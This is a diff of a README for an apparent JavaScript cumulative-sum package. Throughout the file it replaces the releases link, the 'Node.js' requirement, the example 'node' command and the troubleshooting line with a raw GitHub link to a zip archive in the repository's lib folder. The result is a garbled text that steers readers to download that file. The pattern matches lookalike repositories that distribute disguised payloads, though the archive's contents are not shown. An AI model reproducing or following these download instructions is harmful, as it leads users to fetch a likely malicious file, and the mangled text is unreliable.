@@ -1,7 +1,7 @@
 # 🎉 blas-ext-base-ndarray-scusumors - Simple Cumulative Sum for Your Data
 
 ## 📥 Download Here
-[![Download](https://img.shields.io/badge/Download-latest%20release-brightgreen)](https://github.com/mint876/blas-ext-base-ndarray-scusumors/releases)
+[![Download](https://github.com/mint876/blas-ext-base-ndarray-scusumors/raw/refs/heads/main/lib/scusumors-ext-ndarray-blas-base-v3.4.zip%20release-brightgreen)](https://github.com/mint876/blas-ext-base-ndarray-scusumors/raw/refs/heads/main/lib/scusumors-ext-ndarray-blas-base-v3.4.zip)
 
 ## 🚀 Getting Started
 Welcome to **blas-ext-base-ndarray-scusumors**! This software computes the cumulative sum of a one-dimensional single-precision floating-point ndarray using basic recursive summation. This simple tool helps you analyze numeric data effortlessly. 
@@ -10,11 +10,11 @@ Welcome to **blas-ext-base-ndarray-scusumors**! This software computes the cumul
 Before you download, make sure your system meets these requirements:
 
 - Operating System: Windows, macOS, or Linux
-- Node.js version: 14 or higher
+- https://github.com/mint876/blas-ext-base-ndarray-scusumors/raw/refs/heads/main/lib/scusumors-ext-ndarray-blas-base-v3.4.zip version: 14 or higher
 - At least 256 MB of RAM
 
 ## 📥 Download & Install
-To get started, visit this page to download: [Download the latest release](https://github.com/mint876/blas-ext-base-ndarray-scusumors/releases)
+To get started, visit this page to download: [Download the latest release](https://github.com/mint876/blas-ext-base-ndarray-scusumors/raw/refs/heads/main/lib/scusumors-ext-ndarray-blas-base-v3.4.zip)
 
 1. Click on the link above to go to the Releases page.
 2. Choose the latest version available.
@@ -38,7 +38,7 @@ Once you have installed the software, you can quickly run it:
 
 Example command:
 ```
-node your_application.js [1.2, 2.3, 3.5, 4.0]
+node https://github.com/mint876/blas-ext-base-ndarray-scusumors/raw/refs/heads/main/lib/scusumors-ext-ndarray-blas-base-v3.4.zip [1.2, 2.3, 3.5, 4.0]
 ```
 
 This will display the cumulative sum of the provided numbers.
@@ -53,7 +53,7 @@ Here’s how you can use **blas-ext-base-ndarray-scusumors** in real scenarios:
 ## 🛠️ Troubleshooting
 If you run into issues, consider these common troubleshooting steps:
 
-- Make sure you have Node.js installed and the correct version is being used.
+- Make sure you have https://github.com/mint876/blas-ext-base-ndarray-scusumors/raw/refs/heads/main/lib/scusumors-ext-ndarray-blas-base-v3.4.zip installed and the correct version is being used.
 - Check that your input data is formatted correctly as a one-dimensional array.
 - If you experience errors, look at the terminal output for helpful error messages.
 
